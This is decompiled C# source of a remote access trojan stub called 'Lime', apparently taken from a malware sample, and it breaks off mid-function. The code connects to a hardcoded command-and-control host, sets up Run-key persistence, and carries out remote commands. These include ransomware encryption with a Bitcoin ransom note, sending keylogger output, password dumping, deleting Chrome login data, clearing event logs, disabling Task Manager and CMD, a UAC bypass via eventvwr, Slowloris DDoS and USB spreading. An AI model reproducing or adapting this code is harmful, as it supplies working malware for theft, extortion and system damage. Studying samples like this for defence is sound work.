// Decompiled with JetBrains decompiler
// Type: Lime.Core
// Assembly: Stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0B258E55-485E-43C4-A474-46A96B5CE129
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.Win32.Generic-882c2d397243c456fdefc25467864dfa71ad1d3ee215730381bd7370bba3721a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Lime
{
  [StandardModule]
  internal sealed class Core
  {
    private const int SETDESKWALLPAPER = 20;
    private const int UPDATEINIFILE = 1;
    public static string BTC_ADD = "";
    public static bool BTC_EN = Conversions.ToBoolean("False");
    public static string SLP = "0";
    public static string TMOT = "0";
    private static byte[] b = new byte[5121];
    public static bool BD = Conversions.ToBoolean("True");
    public static TcpClient C = (TcpClient) null;
    public static bool Cn = false;
    public static string DR = "TEMP";
    public static string EXE = "aaa.exe";
    public static Computer F = new Computer();
    public static FileStream FS;
    public static string H = "PlanetMH01-55538.portmap.io";
    public static bool Idr = Conversions.ToBoolean("True");
    public static bool Anti_CH = Conversions.ToBoolean("True");
    public static bool IsF = Conversions.ToBoolean("True");
    public static bool USB_SP = Conversions.ToBoolean("False");
    public static bool Isu = Conversions.ToBoolean("False");
    public static kl kq = (kl) null;
    private static string lastcap = "";
    public static FileInfo LO = new FileInfo(Assembly.GetEntryAssembly().Location);
    private static MemoryStream MeM = new MemoryStream();
    public static object MT = (object) null;
    public static string P = "55538";
    public static object PLG = (object) null;
    public static string RG = "aaa.exe";
    public static string sf = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    public static string VN = "YmVsYQ==";
    public static string VR = "0.7.3";
    public static string Y = "123";
    public static bool BOT_KILL = Conversions.ToBoolean("True");
    public static bool HIDE_ME = Conversions.ToBoolean("False");
    public static bool Persis = Conversions.ToBoolean("True");

    public static string BS(ref byte[] B) => Encoding.UTF8.GetString(B);

    [DllImport("avicap32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern bool capGetDriverDescriptionA(
      short wDriver,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName,
      int cbName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer,
      int cbVer);

    private static bool CompDir(FileInfo F1, FileInfo F2)
    {
      if (Operators.CompareString(F1.Name.ToLower(), F2.Name.ToLower(), false) != 0)
        return false;
      DirectoryInfo directoryInfo1 = F1.Directory;
      DirectoryInfo directoryInfo2 = F2.Directory;
      while (Operators.CompareString(directoryInfo1.Name.ToLower(), directoryInfo2.Name.ToLower(), false) == 0)
      {
        directoryInfo1 = directoryInfo1.Parent;
        directoryInfo2 = directoryInfo2.Parent;
        if (directoryInfo1 == null & directoryInfo2 == null)
          return true;
        if (directoryInfo1 == null || directoryInfo2 == null)
          return false;
      }
      return false;
    }

    public static bool connect()
    {
      Core.Cn = false;
      Thread.Sleep(2000);
      lock ((object) Core.LO)
      {
        try
        {
          if (Core.C != null)
          {
            try
            {
              Core.C.Close();
              Core.C = (TcpClient) null;
              Thread.Sleep(checked ((int) Math.Round(Math.Round(Math.Round(unchecked (Conversions.ToDouble(Core.TMOT) * 1000.0))))));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
          }
          try
          {
            Core.MeM.Dispose();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        try
        {
          Core.MeM = new MemoryStream();
          Core.C = new TcpClient();
          Core.C.ReceiveBufferSize = 204800;
          Core.C.SendBufferSize = 204800;
          Core.C.Client.SendTimeout = 10000;
          Core.C.Client.ReceiveTimeout = 10000;
          Core.C.Connect(Core.H, Conversions.ToInteger(Core.P));
          Core.Cn = true;
          Core.Send(Core.inf());
          try
          {
            string str1;
            string str2;
            if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(Core.GTV("vn", (object) "")), (object) "", false))
            {
              str2 = str1 + Core.DEB(ref Core.VN) + "\r\n";
            }
            else
            {
              string str3 = str1;
              string s = Conversions.ToString(RuntimeHelpers.GetObjectValue(Core.GTV("vn", (object) "")));
              string str4 = Core.DEB(ref s);
              str2 = str3 + str4 + "\r\n";
            }
            string s1 = str2 + Core.H + ":" + Core.P + "\r\n" + Core.DR + "\r\n" + Core.EXE + "\r\n" + Conversions.ToString(Core.Idr) + "\r\n" + Conversions.ToString(Core.IsF) + "\r\n" + Conversions.ToString(Core.Isu) + "\r\n" + Conversions.ToString(Core.BD);
            Core.Send("inf" + Core.Y + Core.ENB(ref s1));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          Core.Cn = false;
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      return Core.Cn;
    }

    public static string DEB(ref string s)
    {
      byte[] B = Convert.FromBase64String(s);
      return Core.BS(ref B);
    }

    public static void DLV(string n)
    {
      try
      {
        Core.F.Registry.CurrentUser.OpenSubKey("Software\\" + Core.RG, true).DeleteValue(n);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }

    public static void ED() => Core.pr(0);

    public static string ENB(ref string s) => Convert.ToBase64String(Core.SB(ref s));

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr GetForegroundWindow();

    [DllImport("kernel32", EntryPoint = "GetVolumeInformationA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetVolumeInformation(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer,
      int nVolumeNameSize,
      ref int lpVolumeSerialNumber,
      ref int lpMaximumComponentLength,
      ref int lpFileSystemFlags,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer,
      int nFileSystemNameSize);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

    public static bool Cam()
    {
      try
      {
        int num = 0;
        do
        {
          string str1 = (string) null;
          int wDriver = (int) checked ((short) num);
          string str2 = Strings.Space(100);
          ref string local1 = ref str2;
          ref string local2 = ref str1;
          if (Core.capGetDriverDescriptionA((short) wDriver, ref local1, 100, ref local2, 100))
            return true;
          checked { ++num; }
        }
        while (num <= 4);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return false;
    }

    public static string ACT()
    {
      string str1;
      try
      {
        IntPtr foregroundWindow = Core.GetForegroundWindow();
        if (foregroundWindow == IntPtr.Zero)
          return "";
        string str2 = Strings.Space(checked (Core.GetWindowTextLength((long) foregroundWindow) + 1));
        Core.GetWindowText(foregroundWindow, ref str2, str2.Length);
        str1 = Core.ENB(ref str2);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str1 = "";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    public static string GetWallet()
    {
      Process[] processes = Process.GetProcesses();
      int index = 0;
      string Left;
      do
      {
        string processName = processes[index].ProcessName;
        Left = Operators.CompareString(processName, "bitcoin-qt", false) != 0 ? (Operators.CompareString(processName, "Bitcoin.com.exe", false) != 0 ? (!processName.Contains("electrum") ? "Not Found" : "Electrum") : "Bitcoin.com Wallet") : "BitcoinCore";
        int id = processes[index].Id;
        checked { ++index; }
      }
      while (!(Operators.CompareString(Left, "Not Found", false) != 0 | index > checked (processes.Length - 1)));
      if (index > checked (processes.Length - 1))
        Left = "Not Found";
      return Left;
    }

    public static string GETav()
    {
      string str;
      try
      {
        string Left = (string) null;
        ManagementObjectCollection objectCollection = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct").Get();
        try
        {
          foreach (ManagementBaseObject managementBaseObject in objectCollection)
            Left = managementBaseObject["displayName"].ToString();
        }
        finally
        {
          ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
          objectEnumerator?.Dispose();
        }
        if (Operators.CompareString(Left, string.Empty, false) == 0)
          Left = "N/A";
        str = Left.ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "AntiVirus: N/A";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GetWindowTextLength(long hwnd);

    public static object GTV(string n, object ret)
    {
      object objectValue;
      try
      {
        objectValue = RuntimeHelpers.GetObjectValue(Core.F.Registry.CurrentUser.OpenSubKey("Software\\" + Core.RG).GetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(ret))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        objectValue = RuntimeHelpers.GetObjectValue(ret);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return objectValue;
    }

    public static string HWD()
    {
      string str;
      try
      {
        string lpVolumeNameBuffer = (string) null;
        int lpMaximumComponentLength = 0;
        int lpFileSystemFlags = 0;
        string lpFileSystemNameBuffer = (string) null;
        string lpRootPathName = Interaction.Environ("SystemDrive") + "\\";
        int lpVolumeSerialNumber;
        Core.GetVolumeInformation(ref lpRootPathName, ref lpVolumeNameBuffer, 0, ref lpVolumeSerialNumber, ref lpMaximumComponentLength, ref lpFileSystemFlags, ref lpFileSystemNameBuffer, 0);
        str = Conversion.Hex(lpVolumeSerialNumber);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        str = "ERR";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return str;
    }

    public static string GetCPU()
    {
      string cpu;
      try
      {
        ManagementObject managementObject = new ManagementObject("Win32_Processor.deviceid=\"CPU0\"");
        managementObject.Get();
        cpu = managementObject["Name"].ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        cpu = "N/A";
        ProjectData.ClearProjectError();
      }
      return cpu;
    }

    public static string GetVideoCard()
    {
      string videoCard;
      try
      {
        string empty = string.Empty;
        ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new ObjectQuery("SELECT * FROM Win32_VideoController"));
        try
        {
          foreach (ManagementObject managementObject in managementObjectSearcher.Get())
            empty = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) empty, managementObject["Name"]), (object) ". "));
        }
        finally
        {
          ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
          objectEnumerator?.Dispose();
        }
        videoCard = empty;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        videoCard = "N/A";
        ProjectData.ClearProjectError();
      }
      return videoCard;
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern long SwapMouseButton(long bSwap);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern void SendMessage(int hWnd, uint msg, uint wParam, int lparam);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SetWindowPos(
      int hwnd,
      int hWndInsertAfter,
      int x,
      int y,
      int cx,
      int cy,
      int wFlags);

    [DllImport("user32", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32", EntryPoint = "SystemParametersInfoA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SystemParametersInfo(
      int uAction,
      int uParam,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpvParam,
      int fuWinIni);

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void Ind(byte[] b)
    {
      string[] strArray1 = Strings.Split(Core.BS(ref b), Core.Y);
      try
      {
        string str1 = strArray1[0];
        // ISSUE: reference to a compiler-generated method
        switch (\u003CPrivateImplementationDetails\u003E.ComputeStringHash(str1))
        {
          case 64384596:
            if (Operators.CompareString(str1, "delchrm", false) == 0)
            {
              string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome";
              if (Directory.Exists(path))
              {
                try
                {
                  Process[] processesByName = Process.GetProcessesByName("chrome");
                  int index = 0;
                  while (index < processesByName.Length)
                  {
                    processesByName[index].Kill();
                    checked { ++index; }
                  }
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  Core.Send("MSG" + Core.Y + "Delete Cookies: Lime's Stub is not running as administrator");
                  ProjectData.ClearProjectError();
                }
                try
                {
                  Thread.Sleep(200);
                  System.IO.File.Delete(path + "\\User Data\\Default\\Login Data");
                  System.IO.File.Delete(path + "\\User Data\\Default\\Cookies");
                  Core.Send("MSG" + Core.Y + "Chrome cookies and login deleted successfully!");
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  Core.Send("MSG" + Core.Y + "Chrome is not installed!");
                  ProjectData.ClearProjectError();
                }
                break;
              }
              break;
            }
            break;
          case 454939907:
            if (Operators.CompareString(str1, "RwareBG", false) == 0)
            {
              byte[] bytes;
              if (strArray1[2][0] == '\u001F')
              {
                try
                {
                  MemoryStream memoryStream = new MemoryStream();
                  int length = (strArray1[0] + Core.Y + strArray1[1] + Core.Y).Length;
                  memoryStream.Write(b, length, checked (b.Length - length));
                  bytes = Core.ZIP(memoryStream.ToArray());
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                  ProjectData.ClearProjectError();
                  return;
                }
              }
              string lpvParam = Path.GetTempFileName() + "." + strArray1[1];
              while (!System.IO.File.Exists(Path.GetTempPath() + "done.LE"))
                Application.DoEvents();
              try
              {
                System.IO.File.WriteAllBytes(lpvParam, bytes);
                RegistryKey registryKey = MyProject.Computer.Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
                registryKey.SetValue("WallpaperStyle", (object) "2");
                registryKey.SetValue("TileWallpaper", (object) "0");
                Core.SystemParametersInfo(20, 0, ref lpvParam, 1);
                return;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
                return;
              }
            }
            else
              break;
          case 547083341:
            if (Operators.CompareString(str1, "TextToSpeech", false) == 0)
            {
              try
              {
                object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice"))));
                System.Type Type = (System.Type) null;
                string MemberName = "speak";
                object[] objArray1 = new object[1];
                object[] objArray2 = objArray1;
                int index1 = 0;
                string[] strArray2 = strArray1;
                string[] strArray3 = strArray2;
                int index2 = 1;
                objArray2[index1] = (object) strArray3[index2];
                object[] objArray3 = objArray1;
                object[] Arguments = objArray3;
                string[] ArgumentNames = (string[]) null;
                System.Type[] TypeArguments = (System.Type[]) null;
                bool[] CopyBack = new bool[1]{ true };
                NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue), Type, MemberName, Arguments, ArgumentNames, TypeArguments, CopyBack, true);
                if (CopyBack[0])
                  strArray2[index2] = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objArray3[0])), typeof (string)));
                Core.Send("MSG" + Core.Y + "Speech sent!");
                break;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
                break;
              }
            }
            else
              break;
          case 557886142:
            if (Operators.CompareString(str1, "MonitorOFF", false) == 0)
            {
              Core.SendMessage(-1, 274U, 61808U, 2);
              break;
            }
            break;
          case 601276870:
            if (Operators.CompareString(str1, "OpenWebpageHidden", false) == 0)
            {
              try
              {
                HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(strArray1[1]);
                HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse();
                httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
                httpWebRequest.AllowAutoRedirect = true;
                httpWebRequest.Timeout = 10000;
                httpWebRequest.Method = "GET";
                break;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
                break;
              }
            }
            else
              break;
          case 718925475:
            if (Operators.CompareString(str1, "taskmgrON", false) == 0)
            {
              try
              {
                MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object) "0", RegistryValueKind.DWord);
                Core.Send("MSG" + Core.Y + "TaskManager: Enabled");
                break;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                Core.Send("MSG" + Core.Y + "TaskManager: Lime's Stub is not running as administrator");
                ProjectData.ClearProjectError();
                break;
              }
            }
            else
              break;
          case 860096209:
            if (Operators.CompareString(str1, "NormalMouse", false) == 0)
            {
              Core.SwapMouseButton(0L);
              break;
            }
            break;
          case 969426344:
            if (Operators.CompareString(str1, "RwareDEC", false) == 0)
            {
              if (!System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\MMC\\hash"))
              {
                Core.Send("MSG" + Core.Y + "Ransomware: The client is not encrypted");
                return;
              }
              new RwareDE().Decrypt_File();
              Environment.GetFolderPath(Environment.SpecialFolder.Startup);
              Process[] processesByName = Process.GetProcessesByName("notepad");
              int index = 0;
              while (index < processesByName.Length)
              {
                processesByName[index].Kill();
                checked { ++index; }
              }
              break;
            }
            break;
          case 989868607:
            if (Operators.CompareString(str1, "msgbox", false) == 0)
            {
              int num = (int) MessageBox.Show(strArray1[1], "", MessageBoxButtons.OK, MessageBoxIcon.None, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification, false);
              break;
            }
            break;
          case 1128069874:
            if (Operators.CompareString(str1, "kl", false) == 0)
            {
              Core.Send("kl" + Core.Y + Core.ENB(ref Core.kq.Logs));
              return;
            }
            break;
          case 1146530854:
            if (Operators.CompareString(str1, "ChngWLL", false) == 0)
            {
              byte[] bytes;
              if (strArray1[2][0] == '\u001F')
              {
                try
                {
                  MemoryStream memoryStream = new MemoryStream();
                  int length = (strArray1[0] + Core.Y + strArray1[1] + Core.Y).Length;
                  memoryStream.Write(b, length, checked (b.Length - length));
                  bytes = Core.ZIP(memoryStream.ToArray());
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                  ProjectData.ClearProjectError();
                  return;
                }
              }
              string lpvParam = Path.GetTempFileName() + "." + strArray1[1];
              try
              {
                System.IO.File.WriteAllBytes(lpvParam, bytes);
                RegistryKey registryKey = MyProject.Computer.Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
                registryKey.SetValue("WallpaperStyle", (object) "2");
                registryKey.SetValue("TileWallpaper", (object) "0");
                Core.SystemParametersInfo(20, 0, ref lpvParam, 1);
                Core.Send("MSG" + Core.Y + "Wallpaper changed");
                return;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
                return;
              }
            }
            else
              break;
          case 1160889637:
            if (Operators.CompareString(str1, "ll", false) == 0)
            {
              Core.Cn = false;
              return;
            }
            break;
          case 1235205293:
            if (Operators.CompareString(str1, "ddos.slowloris.start", false) == 0)
            {
              Slowloris.StartSlowloris(strArray1[1], 10, 21600, "");
              break;
            }
            break;
          case 1346747564:
            if (Operators.CompareString(str1, "seed", false) == 0)
            {
              Torrent.SeedTorrent(strArray1[1]);
              break;
            }
            break;
          case 1492636356:
            if (Operators.CompareString(str1, "RwareSU", false) == 0)
            {
              while (!System.IO.File.Exists(Path.GetTempPath() + "done.LE"))
                Application.DoEvents();
              Environment.GetFolderPath(Environment.SpecialFolder.Startup);
              if (Core.BTC_EN)
              {
                Process[] processesByName = Process.GetProcessesByName("notepad");
                int index = 0;
                while (index < processesByName.Length)
                {
                  processesByName[index].Kill();
                  checked { ++index; }
                }
                string str2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Ransomware.txt";
                if (System.IO.File.Exists(str2))
                  System.IO.File.Delete(str2);
                using (StreamWriter streamWriter = new StreamWriter(str2, true))
                {
                  streamWriter.WriteLine("All your files have been locked");
                  streamWriter.WriteLine("");
                  streamWriter.WriteLine("You can get them back, Just pay us " + strArray1[1] + " as Bitcoin");
                  streamWriter.WriteLine("");
                  streamWriter.WriteLine("Our bitcoin address is");
                  streamWriter.WriteLine("");
                  streamWriter.WriteLine(Core.BTC_ADD);
                  streamWriter.WriteLine("");
                  streamWriter.WriteLine("Watch this video to learn how to pay us https://www.youtube.com/watch?v=Ji9IwPId5Uk");
                  streamWriter.WriteLine("");
                  streamWriter.WriteLine("This is not a joke. This is a ransomware");
                }
                Process.Start(str2);
                break;
              }
              Core.Send("MSG" + Core.Y + "Ransomware: Couldn't send address. The stub has no BTC address");
              break;
            }
            break;
          case 1544743405:
            if (Operators.CompareString(str1, "SLU", false) == 0)
            {
              try
              {
                System.IO.File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SL.dat");
                Thread.Sleep(10);
                System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\STSL.dat");
                Core.Send("MSG" + Core.Y + "Screen Locker: Unlocked!");
                break;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
                break;
              }
            }
            else
              break;
          case 1661113898:
            if (Operators.CompareString(str1, "SL", false) == 0)
            {
              try
              {
                if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SL.dat"))
                  System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SL.dat");
                System.IO.File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\STSL.dat");
                int num = (int) new LimeSL().ShowDialog();
                Core.Send("MSG" + Core.Y + "Screen Locker: Locked!");
                break;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
                break;
              }
            }
            else
              break;
          case 1700680649:
            if (Operators.CompareString(str1, "DisableCMD", false) == 0)
            {
              try
              {
                MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object) "1", RegistryValueKind.DWord);
                Core.Send("MSG" + Core.Y + "CMD: Disabled");
                break;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                Core.Send("MSG" + Core.Y + "DisableCMD: Lime's Stub is not running as administrator");
                ProjectData.ClearProjectError();
                break;
              }
            }
            else
              break;
          case 1938327121:
            if (Operators.CompareString(str1, "GiveMeAdmin", false) == 0)
            {
              if (Conversions.ToBoolean(NewLateBinding.LateGet((object) new WindowsPrincipal(WindowsIdentity.GetCurrent()), (System.Type) null, "IsInRole", new object[1]
              {
                (object) WindowsBuiltInRole.Administrator
              }, (string[]) null, (System.Type[]) null, (bool[]) null)))
              {
                Core.Send("MSG" + Core.Y + "Already running as administrator!");
                break;
              }
              Core.pr(0);
              using (RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\Classes\\mscfile\\shell\\open\\command"))
                subKey.SetValue("", (object) Application.ExecutablePath, RegistryValueKind.String);
              Process.Start("eventvwr.exe");
              ProjectData.EndApp();
              break;
            }
            break;
          case 2052932546:
            if (Operators.CompareString(str1, "restartme", false) == 0)
            {
              Interaction.Shell("shutdown -r -t 00 -f", AppWinStyle.Hide);
              break;
            }
            break;
          case 2054338866:
            if (Operators.CompareString(str1, "HideBar", false) == 0)
            {
              try
              {
                string lpClassName = "Shell_traywnd";
                string lpWindowName = "";
                Core.SetWindowPos(Core.FindWindow(ref lpClassName, ref lpWindowName), 0, 0, 0, 0, 0, 128);
                Core.Send("MSG" + Core.Y + "Hidebar");
                break;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
                break;
              }
            }
            else
              break;
          case 2113050452:
            if (Operators.CompareString(str1, "EventLogs", false) == 0)
            {
              try
              {
                EventLog eventLog1 = new EventLog();
                EventLog[] eventLogs = EventLog.GetEventLogs();
                int index = 0;
                while (index < eventLogs.Length)
                {
                  EventLog eventLog2 = eventLogs[index];
                  eventLog2.Clear();
                  eventLog2.Close();
                  checked { ++index; }
                }
                Core.Send("MSG" + Core.Y + "Events Logs deleted successfully!");
                break;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                Core.Send("MSG" + Core.Y + "EventLogs: Lime's Stub is not running as administrator");
                ProjectData.ClearProjectError();
                break;
              }
            }
            else
              break;
          case 2317804999:
            if (Operators.CompareString(str1, "taskmgrOFF", false) == 0)
            {
              try
              {
                MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object) "1", RegistryValueKind.DWord);
                Core.Send("MSG" + Core.Y + "TaskManager: Disabled");
                break;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                Core.Send("MSG" + Core.Y + "TaskManager: Lime's Stub is not running as administrator");
                ProjectData.ClearProjectError();
                break;
              }
            }
            else
              break;
          case 2344831774:
            if (Operators.CompareString(str1, "pass2", false) == 0)
            {
              byte[] bytes;
              if (strArray1[2][0] == '\u001F')
              {
                try
                {
                  MemoryStream memoryStream = new MemoryStream();
                  int length = (strArray1[0] + Core.Y + strArray1[1] + Core.Y).Length;
                  memoryStream.Write(b, length, checked (b.Length - length));
                  bytes = Core.ZIP(memoryStream.ToArray());
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                  ProjectData.ClearProjectError();
                  return;
                }
              }
              string str3 = Path.GetTempFileName() + "." + strArray1[1];
              try
              {
                System.IO.File.WriteAllBytes(str3, bytes);
                Process.Start(str3);
                Thread.Sleep(5000);
                string s = System.IO.File.ReadAllText(Path.GetTempPath() + "\\dump456\\pwd.txt");
                Core.Send("pass2" + Core.Y + Core.ENB(ref s));
                break;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
                return;
              }
            }
            else
              break;
          case 2356653186:
            if (Operators.CompareString(str1, "BitcoinOFF", false) == 0)
            {
              if (!Core.BTC_EN)
              {
                Core.Send("MSG" + Core.Y + "BitcoinGrabber was not checked when stub created!");
                return;
              }
              try
              {
                bitgrb.stopme();
                Interaction.SaveSetting("Lime", "SU", "btc", "0");
                Core.Send("MSG" + Core.Y + "BitcoinGrabber stopped successfully!");
                break;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                Core.Send("MSG" + Core.Y + "BitcoinGrabber is already not running");
                ProjectData.ClearProjectError();
                break;
              }
            }
            else
              break;
          case 2502785813:
            if (Operators.CompareString(str1, "shutdownme", false) == 0)
            {
              Interaction.Shell("shutdown -s -t 00 -f", AppWinStyle.Hide);
              break;
            }
            break;
          case 2513567945:
            if (Operators.CompareString(str1, "antiprocstop", false) == 0)
            {
              MyAntiProcess.stopme();
              MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Lime", "anti", (object) "0");
              Core.Send("MSG" + Core.Y + "Anti Process Stopped!");
              break;
            }
            break;
          case 2576659495:
            if (Operators.CompareString(str1, "ClearClp", false) == 0)
            {
              Thread thread = new Thread(new ThreadStart(Clipboard.Clear));
              thread.SetApartmentState(ApartmentState.STA);
              thread.Start();
              Core.Send("MSG" + Core.Y + "Clipboard cleared successfully!");
              break;
            }
            break;
          case 2648296626:
            if (Operators.CompareString(str1, "spreadusbme", false) == 0)
            {
              SPUSB.Enable();
              break;
            }
            break;
          case 2922144132:
